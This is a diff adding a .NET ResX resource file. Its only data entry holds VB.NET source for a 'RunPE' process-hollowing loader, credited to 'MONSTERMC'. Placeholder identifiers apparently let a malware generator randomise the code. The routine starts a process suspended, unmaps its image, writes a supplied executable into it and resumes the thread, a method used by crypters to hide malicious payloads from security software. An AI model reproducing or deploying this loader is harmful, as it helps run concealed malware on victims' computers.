@@ -1,0 +1,207 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="String1" xml:space="preserve">
+    <value>Imports System.Runtime.InteropServices
+Imports System.Text
+
+'-------------------------------------------------------------
+' RunPE Writed By : MONSTERMC
+
+' Working In : 64/32 Bit
+
+' RunPE Generator Writed By : MONSTERMC
+
+' Call RunPE : %24% .%23% (Your_Byte, Your_String)
+'-------------------------------------------------------------
+
+Public Class %24% 
+    &lt;DllImport("kernel32", charset:=CharSet.Auto)&gt; _
+    Private Shared Function CreateProcessW(ByVal appName As String, ByVal commandLine As StringBuilder, ByVal %9%  As IntPtr, ByVal thrAttr As IntPtr, &lt;MarshalAs(UnmanagedType.Bool)&gt; ByVal inherit As Boolean, ByVal creation As Integer, _
+            ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
+    End Function
+    &lt;DllImport("ntdll")&gt; _
+    Private Shared Function NtGetContextThread(ByVal hThr As IntPtr, ByVal %14%  As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
+    End Function
+    &lt;DllImport("ntdll")&gt; _
+    Private Shared Function NtUnmapViewOfSection(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
+    End Function
+    &lt;DllImport("ntdll")&gt; _
+    Private Shared Function NtReadVirtualMemory(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSS As Integer, ByRef numRead As IntPtr) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
+    End Function
+    &lt;DllImport("ntdll")&gt; _
+    Private Shared Function NtResumeThread(ByVal hThread As IntPtr, ByVal SC As IntPtr) As UInteger
+    End Function
+    &lt;DllImport("ntdll")&gt; _
+    Private Shared Function NtSetContextThread(ByVal hThr As IntPtr, ByVal %14%  As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
+    End Function
+    &lt;DllImport("kernel32")&gt; _
+    Private Shared Function VirtualAllocEx(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal %18%  As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
+    End Function
+    &lt;DllImport("ntdll", SetLastError:=True)&gt; _
+    Private Shared Function NtWriteVirtualMemory(ByVal hProcess As IntPtr, ByVal %16%  As IntPtr, ByVal lpBuffer As Byte(), ByVal nSS As UInteger, ByVal %20%  As Integer) As Boolean
+    End Function
+    Private Shared Function %1%(ByVal %2% As Long, Optional ByVal %3% As Long = &amp;H4) As Integer
+        Dim %4% As IntPtr
+        Dim %5% As Integer
+        Call NtReadVirtualMemory(Process.GetCurrentProcess.Handle, %2%, %4%, %3%, %5%)
+        Return %4%
+    End Function
+    Public Function %23% (ByVal %6%  As Byte(), ByVal %7%  As String) As Boolean
+        Try
+            Dim %8%  As GCHandle = GCHandle.Alloc(%6% , GCHandleType.Pinned) : Dim hModuleBase As Integer = %8% .AddrOfPinnedObject : %8% .Free()
+            Dim %9%  As IntPtr = IntPtr.Zero
+            Dim %10%  As IntPtr() = New IntPtr(3) {}
+            Dim %11%  As Byte() = New Byte(67) {}
+            Dim %12%  As Integer = BitConverter.ToInt32(%6% , 60)
+            Dim %13%  As Integer
+            Dim %14%  As UInteger() = New UInteger(178) {}
+            %14% (0) = &amp;H10002
+            CreateProcessW(Nothing, New StringBuilder(%7% ), %9% , %9% , False, 4, %9% , Nothing, %11% , %10% )
+            Dim %15%  As Integer = (hModuleBase + %1%(hModuleBase + &amp;H3C))
+            %13%  = %1%(%15%  + &amp;H34)
+            NtUnmapViewOfSection(%10% (0), %13% )
+            Dim %16%  As IntPtr = VirtualAllocEx(%10% (0), %13% , %1%(%15%  + &amp;H50), &amp;H3000, &amp;H40)
+            Dim %17%  As New IntPtr(BitConverter.ToInt32(%6% , %12%  + &amp;H34))
+            Dim %18%  As New IntPtr(BitConverter.ToInt32(%6% , %12%  + 80))
+            Dim %19%  As Integer
+            Dim %20%  As Integer
+            NtWriteVirtualMemory(%10% (0), %16% , %6% , CUInt(CInt(%1%(%15%  + &amp;H54))), %19% )
+            For i = 0 To %1%(%15%  + &amp;H6, 2) - 1
+                Dim %21%  As Integer() = New Integer(9) {}
+                Buffer.BlockCopy(%6% , (%12%  + &amp;HF8) + (i * 40), %21% , 0, 40)
+                Dim %22%  As Byte() = New Byte((%21% (4) - 1)) {}
+                Buffer.BlockCopy(%6% , %21% (5), %22% , 0, %22% .Length)
+                %18%  = New IntPtr(%16% .ToInt32() + %21% (3))
+                %17%  = New IntPtr(%22% .Length)
+                NtWriteVirtualMemory(%10% (0), %18% , %22% , CUInt(%17% ), %20% )
+            Next i
+            NtGetContextThread(%10% (1), %14% )
+            NtWriteVirtualMemory(%10% (0), %14% (41) + &amp;H8, BitConverter.GetBytes(%16% .ToInt32()), CUInt(&amp;H4), %20% )
+            %14% (&amp;H2C) = %13%  + %1%(%15%  + &amp;H28)
+            NtSetContextThread(%10% (1), %14% )
+            NtResumeThread(%10% (1), 0)
+        Catch ex As Exception
+            Return False
+        End Try
+        Return True
+    End Function
+End Class</value>
+  </data>
+</root>
